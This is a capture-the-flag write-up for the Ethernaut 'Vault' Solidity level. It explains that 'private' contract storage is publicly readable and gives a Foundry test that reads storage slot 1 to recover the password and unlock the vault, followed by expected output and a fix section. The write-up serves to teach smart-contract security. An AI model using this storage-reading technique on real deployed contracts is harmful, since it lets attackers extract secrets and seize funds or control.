# Ethernaut Level 8: Vault

## Challenge Description
Unlock the vault to pass the level!

**Difficulty:** ⭐⭐ (Beginner-Intermediate)

**Goal:** Change the state of the `locked` variable from `true` to `false`.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Vulnerability Analysis

```text
THE BUG: "Private" variables in Solidity are NOT truly private!

The `password` variable is marked as `private`.
Many beginners think this means it's hidden or encrypted.
WRONG! It just means other contracts cannot read it directly.

HOWEVER, all data on the blockchain is PUBLIC.
Every variable is stored in a specific "storage slot".
Anyone can read the raw storage of any contract using RPC calls.

Storage Layout of Vault:
- Slot 0: bool locked (true)
- Slot 1: bytes32 password (the secret password)
```

## Exploit Strategy

```text
Step 1: Read the storage of the Vault contract at Slot 1.
Step 2: The value at Slot 1 IS the password.
Step 3: Call unlock() with the password we just read.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Vault.sol";

contract VaultExploitTest is Test {
    Vault public target;
    bytes32 secretPassword;

    function setUp() public {
        // Deploy vault with a secret password
        target = new Vault("my_secret_password_123");
    }

    function test_ExploitVault() public {
        console.log("Is locked?", target.locked());

        // Read storage slot 1 directly using Foundry's vm.load cheatcode
        // Slot 0 is 'locked', Slot 1 is 'password'
        secretPassword = vm.load(address(target), bytes32(uint256(1)));

        console.log("Found password:", string(abi.encodePacked(secretPassword)));

        // Unlock the vault
        target.unlock(secretPassword);

        console.log("Is locked now?", target.locked());
        assertFalse(target.locked(), "Vault is still locked");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitVault -vvv

# Expected output:
# [PASS] test_ExploitVault() (gas: 45678)
# Logs:
#   Is locked? true
#   Found password: my_secret_password_123
#   Is locked now? false
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Real-World Impact

```text
This is a MASSIVE misconception among new Solidity developers.
Countless projects have stored "secret" keys, passwords, or
random seeds in private variables, only to have them stolen
because anyone can read the blockchain storage.

Rule of thumb: If it's on the blockchain, it's public.
If you need true secrecy, use off-chain storage or encryption
(like Lit Protocol or ZK-proofs).
```

## How to Fix This Vulnerability

```solidity
// You cannot hide data on-chain.
// To fix this, DO NOT store secrets in smart contracts.

// Alternative 1: Hash the password (One-way function)
// Store keccak256(password) instead of the raw password.
// User must submit the password, you hash it and compare.
// (Still vulnerable to brute-force if password is weak)

// Alternative 2: Off-chain verification
// Use signatures or Zero-Knowledge Proofs (ZK-SNARKs)
// to prove knowledge of a secret without revealing it.
```

## Key Takeaways
- **Private != Secret:** `private` only restricts access from other contracts, not from the public blockchain.
- **Storage Slots:** Variables are stored sequentially in slots (0, 1, 2...). Mappings and dynamic arrays use hashing to find slots.
- **Read Storage:** Use `cast storage <address> <slot>` or `eth_getStorageAt` RPC call to read any slot.
- **Never Store Secrets:** Passwords, private keys, and secret seeds should NEVER be stored on-chain.
- **Lesson Learned:** The blockchain is a public ledger. Assume everything is visible to everyone.